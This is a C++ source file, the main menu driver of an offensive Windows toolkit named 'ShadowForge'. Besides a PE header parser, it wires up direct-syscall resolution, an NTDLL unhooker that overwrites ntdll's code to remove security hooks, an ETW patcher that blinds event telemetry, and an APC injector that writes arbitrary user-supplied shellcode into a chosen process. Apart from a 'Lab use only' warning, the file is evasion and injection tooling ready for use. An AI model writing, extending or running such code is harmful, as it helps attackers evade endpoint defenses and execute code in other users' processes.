#include "shadowforge.h"
#include "pe_parser.h"
#include "syscalls.h"
#include "unhooker.h"
#include "etw_patcher.h"
#include "injector.h"

void MenuPEParser();
void MenuSyscalls(SyscallManager& sm);
void MenuUnhooker();
void MenuEtwPatcher();
void MenuInjector(SyscallManager& sm);

int main() {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    DWORD mode = 0;
    GetConsoleMode(hOut, &mode);
    SetConsoleMode(hOut, mode | ENABLE_VIRTUAL_TERMINAL_PROCESSING);
    SetConsoleTitleA("ShadowForge v1.0");

    PrintBanner();
    SyscallManager syscallMgr;

    bool running = true;
    while (running) {
        Color::Magenta();
        std::cout << "  +-----------------------------------------------------+\n";
        std::cout << "  |              SHADOWFORGE - MAIN MENU                 |\n";
        std::cout << "  +-----------------------------------------------------+\n";
        Color::Cyan();
        std::cout << "  |  [1]  PE Parser         - Analyze PE headers         |\n";
        std::cout << "  |  [2]  Direct Syscalls   - Resolve SSNs               |\n";
        std::cout << "  |  [3]  NTDLL Unhooker    - Remove usermode hooks      |\n";
        std::cout << "  |  [4]  ETW Patcher       - Blind ETW telemetry        |\n";
        std::cout << "  |  [5]  APC Injector      - Inject via direct syscalls |\n";
        Color::Red();
        std::cout << "  |  [0]  Exit                                           |\n";
        Color::Magenta();
        std::cout << "  +-----------------------------------------------------+\n";
        Color::Reset();

        std::cout << "\n  >> ";
        int choice;
        std::cin >> choice;
        std::cin.ignore(256, '\n');

        switch (choice) {
            case 1: MenuPEParser();           break;
            case 2: MenuSyscalls(syscallMgr); break;
            case 3: MenuUnhooker();           break;
            case 4: MenuEtwPatcher();         break;
            case 5: MenuInjector(syscallMgr); break;
            case 0: running = false;          break;
            default: PrintErr("Invalid.");    break;
        }

        if (running) { std::cout << "\n  Press ENTER..."; std::cin.get(); }
    }
    return 0;
}

void MenuPEParser() {
    Color::Cyan(); std::cout << "\n  === PE PARSER ===\n"; Color::Reset();
    std::cout << "  Path: ";
    std::string path;
    std::getline(std::cin, path);
    if (path.size() >= 2 && path.front() == '"' && path.back() == '"')
        path = path.substr(1, path.size() - 2);

    PEParser parser;
    if (!parser.LoadFile(path)) return;

    std::cout << "  [1] DOS  [2] NT  [3] Sections  [4] Imports  [5] Exports  [6] All\n  >> ";
    int s; std::cin >> s; std::cin.ignore(256, '\n');
    switch (s) {
        case 1: parser.PrintDosHeader(); break;
        case 2: parser.PrintNTHeaders(); break;
        case 3: parser.PrintSections();  break;
        case 4: parser.PrintImports();   break;
        case 5: parser.PrintExports();   break;
        default: parser.PrintAll();      break;
    }
}

void MenuSyscalls(SyscallManager& sm) {
    Color::Cyan(); std::cout << "\n  === DIRECT SYSCALLS ===\n"; Color::Reset();
    if (!sm.ResolveSyscalls()) return;

    std::cout << "  [1] Full table  [2] Lookup function\n  >> ";
    int s; std::cin >> s; std::cin.ignore(256, '\n');

    if (s == 2) {
        std::cout << "  Function name: ";
        std::string name; std::getline(std::cin, name);
        DWORD ssn;
        if (sm.GetSSN(name, ssn)) {
            char buf[128];
            snprintf(buf, sizeof(buf), "%s => SSN 0x%04lX", name.c_str(), (unsigned long)ssn);
            PrintOk(buf);
        } else PrintErr("Not found.");
    } else {
        sm.PrintSyscallTable();
    }
}

void MenuUnhooker() {
    Color::Cyan(); std::cout << "\n  === NTDLL UNHOOKER ===\n"; Color::Reset();
    PrintWarn("This overwrites ntdll .text section in memory.");
    std::cout << "  Proceed? [y/N]: ";
    char c; std::cin >> c; std::cin.ignore(256, '\n');
    if (c != 'y' && c != 'Y') { PrintInfo("Aborted."); return; }

    NtdllUnhooker u;
    if (u.Unhook()) {
        char buf[128];
        snprintf(buf, sizeof(buf), ".text: %zu bytes | Modified: %zu", u.GetTextSectionSize(), u.GetBytesPatched());
        PrintInfo(buf);
    }
}

void MenuEtwPatcher() {
    Color::Cyan(); std::cout << "\n  === ETW PATCHER ===\n"; Color::Reset();
    std::cout << "  [1] EtwEventWrite  [2] EtwEventWriteFull  [3] Both\n  >> ";
    int s; std::cin >> s; std::cin.ignore(256, '\n');

    EtwPatcher p;
    switch (s) {
        case 1: p.PatchEtwEventWrite();    break;
        case 2: p.PatchEtwEventWriteFull(); break;
        default: p.PatchAll();             break;
    }

    std::cout << "\n";
    p.IsPatched("ntdll.dll", "EtwEventWrite")     ? PrintOk("EtwEventWrite: PATCHED")     : PrintWarn("EtwEventWrite: NOT patched");
    p.IsPatched("ntdll.dll", "EtwEventWriteFull")  ? PrintOk("EtwEventWriteFull: PATCHED")  : PrintWarn("EtwEventWriteFull: NOT patched");
}

void MenuInjector(SyscallManager& sm) {
    Color::Cyan(); std::cout << "\n  === APC INJECTOR ===\n"; Color::Reset();
    if (!sm.ResolveSyscalls()) { PrintErr("Syscalls not resolved."); return; }

    PrintWarn("Lab use only.");
    std::cout << "\n  Target PID: ";
    DWORD pid; std::cin >> pid; std::cin.ignore(256, '\n');

    std::cout << "  [1] Obfuscated demo (calc.exe)  [2] Custom hex shellcode\n  >> ";
    int s; std::cin >> s; std::cin.ignore(256, '\n');

    ApcInjector inj(sm);
    if (s == 1) {
        inj.InjectObfuscatedDemo(pid);
    } else if (s == 2) {
        std::cout << "  Hex: ";
        std::string hex; std::getline(std::cin, hex);
        std::vector<uint8_t> sc;
        for (size_t i = 0; i + 1 < hex.size(); i += 2) {
            if (hex[i] == ' ') { i--; continue; }
            try { sc.push_back((uint8_t)std::stoul(hex.substr(i,2), nullptr, 16)); }
            catch (...) { PrintErr("Bad hex."); return; }
        }
        if (sc.empty()) { PrintErr("Empty shellcode."); return; }
        inj.Inject(pid, sc.data(), sc.size());
    }
}
